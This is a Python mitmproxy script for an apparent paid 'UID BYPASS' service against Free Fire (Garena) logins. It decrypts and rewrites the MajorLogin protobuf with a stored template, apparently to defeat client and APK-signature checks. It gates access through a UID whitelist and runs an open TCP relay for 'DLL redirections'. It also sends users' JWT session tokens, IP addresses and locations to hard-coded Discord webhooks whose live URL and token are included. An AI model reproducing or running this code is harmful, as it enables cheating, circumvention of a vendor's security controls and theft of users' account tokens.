from mitmproxy import http
import json
import asyncio
import aiohttp
from src.core.encryption_utils import aes_decrypt, encrypt_api
from src.protobuf.protobuf_utils import get_available_room, CrEaTe_ProTo
from src.database.mongo_client import MongoDBClient
from src.utils.console import Console
from mitmproxy.tools.main import mitmdump
import copy
import time
import os
import sys
import threading
import re
import requests as req_lib
import sqlite3
import socket

# Correct path logic: Ensure 'src' folder inside 'b_prx' is findable
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

DISCORD_WEBHOOK_URL1 = "yF6ao3wxEak7RLRBQEIEngEhAO9QCYR-r0SoA-9z6sQd8oFDBF1tW4Q"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1336336585142177893/yF6ao3wxEak7RLRBQEIEngEhAO9QCYR-r0SoA-9z6sQd8oFDBF1tW4Q"

# MOBILE_PROTO FROM OG SRC (WORKING)
MOBILE_PROTO = "25f16c42b17c8239fccb04095cf57404c3b0bb26906e7ba86f20ce787935f3b9eea0e0cf108b16269a322d06d9cadf6b4e6822d26490eb78ac78ea85705321894d288f6517b2a17b6027ebfd00ed9b336a2ec1c6bed513c218e0bb142bbc045782b578328fe0cea774f6e60f3e278794110dc58ed62a87948fc4005882a1ac2a10d18762c6789d2c148d1924b3e04eff87b8538dfc5f8bfe8ff503dc2849f2343fa13bb892005d68bad712508475f1735869b65b24a48f96c95937794363497b7897600cf8786407d6d8bc01d87eaee4a00da554fc96b6f415119e29efe1fe491c244edcc3091e5a2148954e870a3a1c5cddcf022ca8453a030013b4f2a8dd18d8e5e5be88c04cab6c0933d96bcc44600f619b424e89f95f979b46f457e51d6742a4398ca4c8d4b9f5a3e8c9c3c08363bfcd8d072518973c099abf69958e130b027f36dc007d449e544037f61a21fbd7735c2014028c3d29ccefcf3a25f2a65bd574f75a8ac8325106b75155ede5ee1919fbc12b3d86f34e564f3728cdf8165d399f1de23a2cee57ec283d36e1525d2392cbcffd5a3bf7766867eda25720864aeb06c729bc9fe254059376fcd70e4879ea6f77355948843585e6380c220793065084ecb64a8596183815c297d5bf878927a5205c57601ea87bbf7451d3c4d83ffdaec2f891e9da8959cfc5a655c5be056712538eee05518dfa80072a4c27d2203c2fd3c5dd2b20c0fbb1f2fd7db64d5d3e08e7141a3093007909f98c7984dcc940e9000ac573af6cd81f78d8e20f2fb0b34e6bf01dee9100f458019641dc854920cd8be6f5599e239d68e4b5fef9c257710f4b4009b45086391c6cda3314638dae22a96cfeedf97b52d1fa6c30195f2ce4b1064db23929a38a1103d3d4edd6c9e29203a7b1ba975b681fbcff1e4c6d910dc9e98a02339d1d7d748c877a9726dd653547c8442aa12577a62954c19c24857ea605decf1ede72ce5b159398bd4082cafeaad73cdb5563c45f9476b6069f87dec9e0c18fa2c944806f35c8a07f52e3bf66b545f5457e06d04754a869388596f1653cf951caae15f2d48191ec8db0ec813682cbda38b4aaa3defcef332256fa549ff4fcc9f0b7e08f5c71d4ce6bc366f960e15c0018526b93c58f445e339b14ba5b296c546314de30f2c66508bf4436b6787b095603b918aaff638711ddb8255e1e782d299f48aa9fba0b334cff16e3cc1c43225e17cc51f39215e0d2c2afceaed18358787074475d928a6665130bb8cff4a901a7b8f5ec67298fb9b4d665a0182a11abb55109b838c58ebcb56e29c617fb82b1e1a7c49b934de0d12bd4775ae8abd216848a6cea02ebc44fcd14a7aa9ac09b641fee138d5cad7eeb0a3c23df06846f2bfc8c0a87e4a884915909726c34dddd35111a003f524437bdcbe10b3e60b7d442f39666ad7916c784160be8df"

def init_template():
    try:
        dec_bytes = aes_decrypt(MOBILE_PROTO)
        return json.loads(get_available_room(dec_bytes.hex()))
    except: return {}

proto_template = init_template()

# ══════════════════════════════════════════════════════════════
# REMOTE UID SERVER CONFIG
# ══════════════════════════════════════════════════════════════
UID_SERVERS = {
    "MAIN":   "https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid",
    "BACKUP": "https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid",
}

# ══════════════════════════════════════════════════════════════
# SQLITE DATABASE SETUP
# ══════════════════════════════════════════════════════════════
DB_FILE = "bot_data.db"
db = sqlite3.connect(DB_FILE, check_same_thread=False)
cur = db.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS whitelist (uid TEXT PRIMARY KEY, region TEXT DEFAULT 'GLOBAL')")
cur.execute("CREATE TABLE IF NOT EXISTS blacklist (uid TEXT PRIMARY KEY)")
cur.execute("""
CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, uid TEXT, ip TEXT, 
    country TEXT, region TEXT, city TEXT, ts INTEGER, status TEXT
)
""")
cur.execute("CREATE TABLE IF NOT EXISTS stats (key TEXT PRIMARY KEY, value INTEGER)")
db.commit()

for k in ("total", "allowed", "blocked"):
    cur.execute("INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)", (k, 0))
db.commit()

def inc_stat(name: str):
    cur.execute("UPDATE stats SET value = value + 1 WHERE key=?", (name,))
    db.commit()

def log_login_db(uid, ip, country, region, city, status):
    ts = int(time.time())
    cur.execute("INSERT INTO login_logs (uid, ip, country, region, city, ts, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (uid, ip, country, region, city, ts, status))
    db.commit()

def lookup_geo(ip):
    if not ip or ip == "127.0.0.1": return "Local", "Local", "Local"
    try:
        r = req_lib.get(f"http://ip-api.com/json/{ip}", timeout=5, proxies={"http": None, "https": None})
        j = r.json()
        return j.get("country", "Unknown"), j.get("regionName", "Unknown"), j.get("city", "Unknown")
    except: return "Unknown", "Unknown", "Unknown"

def checkSubscription(uid: str) -> dict:
    uid = str(uid).strip()
    cur.execute("SELECT 1 FROM blacklist WHERE uid=?", (uid,))
    if cur.fetchone(): return {"valid": False, "reason": "blacklisted"}
    
    try:
        cur.execute("SELECT region, expires_at FROM whitelist WHERE uid=?", (uid,))
        row = cur.fetchone()
        if row:
            region, expires_at = row
            if expires_at and expires_at > 0:
                if int(time.time()) > expires_at:
                    return {"valid": False, "reason": "expired"}
            return {"valid": True, "reason": "local_whitelist", "expiry_date": expires_at or "LIFETIME"}
    except sqlite3.OperationalError:
        cur.execute("SELECT region FROM whitelist WHERE uid=?", (uid,))
        row = cur.fetchone()
        if row: return {"valid": True, "reason": "local_whitelist", "expiry_date": "LIFETIME"}
    for name, url in UID_SERVERS.items():
        try:
            r = req_lib.get(url, timeout=5, proxies={"http": None, "https": None})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    match = re.search(r'(\d{8,})', line)
                    if match and match.group(1) == uid:
                        return {"valid": True, "reason": "remote_whitelist", "expiry_date": "LIFETIME"}
        except: continue
    global mongo_client
    try:
        if mongo_client is None: mongo_client = MongoDBClient()
        return mongo_client.check_subscription(uid)
    except: return {"valid": False, "reason": "db_error"}

def send_to_discord(uid, status, ip, country, city, reason, jwt_data=None):
    try:
        color = 0x2ecc71 if status in ["ALLOWED", "TOKEN_ACCESS"] else 0xe74c3c
        fields = [
            {"name": "UID", "value": f"`{uid or 'N/A'}`", "inline": True},
            {"name": "Status", "value": f"`{status}` ({reason or 'N/A'})", "inline": True},
            {"name": "IP Address", "value": f"`{ip or 'Unknown'}`", "inline": False},
            {"name": "Location", "value": f"🌍 {city or 'Unknown'}, {country or 'Unknown'}", "inline": False},
        ]
        
        if jwt_data:
            fields.append({"name": "Nickname", "value": f"`{jwt_data.get('account_name', 'N/A')}`", "inline": True})
            fields.append({"name": "Account ID", "value": f"`{jwt_data.get('account_id', 'N/A')}`", "inline": True})
            fields.append({"name": "Region", "value": f"`{jwt_data.get('region', 'N/A')}`", "inline": True})
            if jwt_data.get("token"):
                fields.append({"name": "JWT Token", "value": f"```jwt\n{jwt_data.get('token')}```", "inline": False})

        embed = {
            "title": f"UID BYPASS - Login {status}",
            "color": color,
            "fields": fields,
            "footer": {"text": "UID BYPASS PRIVATE SYSTEM"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
        }
        if "http" in DISCORD_WEBHOOK_URL: req_lib.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=3)
        if "http" in DISCORD_WEBHOOK_URL1: req_lib.post(DISCORD_WEBHOOK_URL1, json={"embeds": [embed]}, timeout=3)
    except: pass

class MajorLoginInterceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        
        # --- WEB PANEL ROUTING (NO INFINITE LOOPS) ---
        if req.host == "127.0.0.1" or req.host == "localhost":
            pass
        else:
            admin_routes = ["/", "/dashboard", "/login", "/logout", "/add_uid", "/remove_uid", "/static", "/favicon.ico", "/api"]
            if any(req.path == r or req.path.startswith(r + "/") or req.path.startswith(r + "?") for r in admin_routes):
                if "freefire" not in req.host.lower() and "garena" not in req.host.lower():
                    req.host = "127.0.0.1"
                    req.port = 5000
                    req.scheme = "http"
                    if "Host" in req.headers:
                        req.headers["Host"] = "127.0.0.1:5000"
                    return
        # ---------------------------------------------

        # URL Logging
        print(f"\033[1;32m[{req.method}]\033[0m \033[1;34m{req.host}\033[0m{req.path} \033[90m-> {req.pretty_url}\033[0m", flush=True)

        if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
            try:
                request_hex = flow.request.content.hex()
                dec_bytes = aes_decrypt(request_hex)
                proto_fields = json.loads(get_available_room(dec_bytes.hex()))

                width = Console.get_width()
                print("\n" + Console.GRAY + "─" * width + Console.RESET, flush=True)
                Console.request("/MajorLogin", "POST")
                print(Console.GRAY + "─" * width + Console.RESET, flush=True)
                Console.info("Intercepted encrypted protobuf payload")
                print(f"         ├─ bytes: {len(flow.request.content)}", flush=True)

                uid = None
                version_field = None
                access_token = None
                open_id = None
                main_active_platform = None
                current_timestamp = None
                game_name = None
                native_lib_path = None
                apk_signature_info = None
                client_variant = None

                # Extractions
                for field_num in ["1", "2", "3"]:
                    if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                        potential_uid = str(proto_fields[field_num]["data"])
                        if potential_uid.isdigit() and len(potential_uid) > 5:
                            uid = potential_uid; break
                
                if "3" in proto_fields: current_timestamp = str(proto_fields["3"].get("data", ""))
                if "4" in proto_fields: game_name = str(proto_fields["4"].get("data", ""))
                if "7" in proto_fields: version_field = str(proto_fields["7"].get("data", ""))
                if "29" in proto_fields: access_token = str(proto_fields["29"].get("data", ""))
                if "22" in proto_fields: open_id = str(proto_fields["22"].get("data", ""))
                if "74" in proto_fields: native_lib_path = str(proto_fields["74"].get("data", ""))
                if "77" in proto_fields: apk_signature_info = str(proto_fields["77"].get("data", ""))
                if "93" in proto_fields: client_variant = str(proto_fields["93"].get("data", ""))
                
                if "99" in proto_fields: main_active_platform = str(proto_fields["99"].get("data", ""))
                elif "100" in proto_fields: main_active_platform = str(proto_fields["100"].get("data", ""))

                Console.divider("DECODED PROTOBUF PAYLOAD")
                Console.proto_field("1-3", "user_id", uid or "NULL")
                Console.proto_field("29", "oauth_token", access_token)
                Console.proto_field("22", "open_id", open_id)
                Console.proto_field("99", "platform_id", main_active_platform)
                Console.proto_field("3", "timestamp", current_timestamp)
                Console.proto_field("4", "app_name", game_name)
                Console.proto_field("7", "app_version", version_field)
                Console.proto_field("74", "native_lib_path", native_lib_path)
                Console.proto_field("77", "apk_signature", apk_signature_info)
                Console.proto_field("93", "client_variant", client_variant)

                # JWT Fetching
                jwt_data = None
                if access_token:
                    try:
                        jwt_res = req_lib.get(f"http://127.0.0.1:1080/access-jwt?access_token={access_token}", timeout=10)
                        if jwt_res.status_code == 200:
                            jwt_data = jwt_res.json()
                            if jwt_data.get("status") == "success":
                                Console.success(f"JWT Access: {jwt_data.get('account_name')} ({jwt_data.get('account_id')})")
                                if jwt_data.get("open_id"): open_id = jwt_data.get("open_id")
                                send_to_discord(uid, "TOKEN_ACCESS", "Intercepted", "Intercepted", "Intercepted", "JWT_API", jwt_data)
                    except: pass

                Console.divider("PROTOBUF MUTATION")
                Console.info("Injecting modified fields into protobuf template")
                modified_proto = copy.deepcopy(proto_template)
                
                mutation_fields = [
                    ("3", "timestamp", current_timestamp),
                    ("4", "app_name", game_name),
                    ("7", "app_version", version_field),
                    ("29", "oauth_token", access_token),
                    ("22", "open_id", open_id),
                    ("74", "native_lib_path", native_lib_path),
                    ("77", "apk_signature_info", apk_signature_info),
                    ("93", "client_variant", client_variant)
                ]

                for f, label, val in mutation_fields:
                    if f in modified_proto and val:
                        modified_proto[f]["data"] = val
                        Console.mutation(f"Field[{f}]", f"{label}={val}")
                
                if main_active_platform:
                    for f in ["99", "100"]:
                        if f in modified_proto: modified_proto[f]["data"] = int(main_active_platform)
                        else: modified_proto[f] = {"wire_type": "varint", "data": int(main_active_platform)}
                    Console.mutation("Field[99/100]", f"platform_id={main_active_platform}")

                proto_bytes = CrEaTe_ProTo(modified_proto)
                hex_data = encrypt_api(proto_bytes)
                flow.request.content = bytes.fromhex(hex_data)
                
                Console.success("Request payload encrypted and injected")
                print(f"         ├─ bytes: {len(flow.request.content)}", flush=True)
            except Exception as e:
                Console.error("Request mutation failed", exception=str(e))

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.request.method.upper() == "POST" and "majorlogin" in flow.request.path.lower():
            try:
                proto_fields = json.loads(get_available_room(flow.response.content.hex()))
                inc_stat("total")

                uid_from_response = None
                for field_num in ["1", "2", "3"]:
                    if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                        raw_val = str(proto_fields[field_num]["data"])
                        match = re.search(r'(\d{8,})', raw_val)
                        if match: uid_from_response = match.group(1); break
                
                if uid_from_response:
                    print(f"Found UID in response field 1: {uid_from_response}", flush=True)
                    client_ip = None
                    try: client_ip = flow.client_conn.peername[0]
                    except: pass
                    country, region_name, city = lookup_geo(client_ip)

                    subscription = checkSubscription(uid_from_response)
                    if not subscription["valid"]:
                        inc_stat("blocked")
                        log_login_db(uid_from_response, client_ip, country, region_name, city, f"BLOCKED ({subscription.get('reason')})")
                        Console.error(f"UID {uid_from_response} BLOCKED", reason=subscription.get('reason'), city=city)
                        send_to_discord(uid_from_response, "BLOCKED", client_ip, country, city, subscription.get('reason'))

                        message = (
                            f"[d4a7aa]\nUID BYPASS ACCESS DENIED\n\n"
                            f"[FFFFFF]Your UID [FF0000]{uid_from_response}[FFFFFF] is not authorized.\n"
                            f"[FFFFFF]Reason: [FF0000]{subscription.get('reason', 'Unauthorized')}[FFFFFF]\n\n"
                            f"[FFFFFF]Please contact support for access.\n[d4a7aa] "
                        )
                        flow.response.content = message.encode(); flow.response.status_code = 400
                    else:
                        inc_stat("allowed")
                        log_login_db(uid_from_response, client_ip, country, region_name, city, f"ALLOWED ({subscription.get('reason')})")
                        Console.success(f"UID {uid_from_response} AUTHORIZED", source=subscription.get('reason'), city=city)
                        send_to_discord(uid_from_response, "ALLOWED", client_ip, country, city, subscription.get('reason'))
            except Exception as e: print(f"Response error: {e}", flush=True)

addons = [MajorLoginInterceptor()]
mongo_client = None

# TCP CONTROLLER
async def handle_tcp(reader, writer):
    from core._sock import SockHandler
    client = SockHandler(reader, writer)
    try:
        ip, port = await client.read_preamble()
        if ip and port:
            r_reader, r_writer = await asyncio.open_connection(ip, port)
            remote = SockHandler(r_reader, r_writer)
            await asyncio.gather(client.pipe(remote), remote.pipe(client), return_exceptions=True)
    except: pass
    finally: await client.close()

def start_tcp():
    async def _run():
        try:
            server = await asyncio.start_server(handle_tcp, '0.0.0.0', 19112)
            async with server: await server.serve_forever()
        except: pass
    threading.Thread(target=lambda: asyncio.run(_run()), daemon=True).start()

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

if __name__ == "__main__":
    import subprocess
    
    # 1. Start Services
    start_tcp()
    subprocess.Popen([sys.executable, os.path.join(BASE_DIR, "access_jwt", "app.py")], 
                     cwd=BASE_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Start Admin Panel
    subprocess.Popen([sys.executable, os.path.join(BASE_DIR, "admin_panel.py")], 
                     cwd=BASE_DIR)
    
    # 2. FIXED DISPLAY (SAFE WIDTH)
    Console.divider("FRX BYPASS — STARTING ALL SERVICES")
    Console.success("Service 1 : mitmproxy      → port 8080 (login interceptor)")
    Console.success("Service 2 : TCP Controller   → port 19112 (DLL raw traffic)")
    Console.success("Service 3 : JWT API          → port 1080 (JWT utility)")
    Console.success("Service 4 : Admin Panel      → port 5000 (web interface)")
    Console.info("Platform  : 3 (Garena Android)")
    Console.info("Method    : my_pb2 real-proto (JWT approach)")
    Console.divider()
    
    Console.success("TCP Controller thread started (port 19112)")
    Console.success("JWT API thread started (port 1080)")
    Console.success("Admin Panel started (port 5000)")
    Console.success("mitmproxy started (port 8080)")
    
    # Static Width Centered Box
    w = 80
    t1 = "▸ ALL SERVICES RUNNING ▸"
    t2 = "▸ UID BYPASS TCP CONTROL CENTER ▸"
    print(f"\n{Console.GRAY}╭{'─' * (w-2)}╮{Console.RESET}", flush=True)
    print(f"{Console.GRAY}│{Console.RESET}{' ' * ((w-2-len(t1))//2)}{Console.CYAN}{Console.BOLD}{t1}{Console.RESET}{' ' * (w-2-len(t1)-((w-2-len(t1))//2))}{Console.GRAY}│{Console.RESET}", flush=True)
    print(f"{Console.GRAY}│{Console.RESET}{' ' * ((w-2-len(t2))//2)}{Console.CYAN}{Console.BOLD}{t2}{Console.RESET}{' ' * (w-2-len(t2)-((w-2-len(t2))//2))}{Console.GRAY}│{Console.RESET}", flush=True)
    print(f"{Console.GRAY}╰{'─' * (w-2)}╯{Console.RESET}", flush=True)
    
    print(f"{Console.GRAY}├{'─' * (w-2)}┤{Console.RESET}", flush=True)
    Console.success("Server Status: ONLINE")
    Console.info("Listening on : 0.0.0.0:19112")
    Console.info("Ready for DLL Redirections...")
    
    try:
        # Automatically detect the Wispbyte port
        proxy_port = os.environ.get("SERVER_PORT", "8080")
        mitmdump(["-s", __file__, "--listen-host", "0.0.0.0", "-p", str(proxy_port), "--set", "block_global=false"])
    except KeyboardInterrupt: pass
    except Exception as e:
        print(f"\n{Console.RED}[CRITICAL ERROR] mitmproxy failed: {e}{Console.RESET}")
        time.sleep(10)
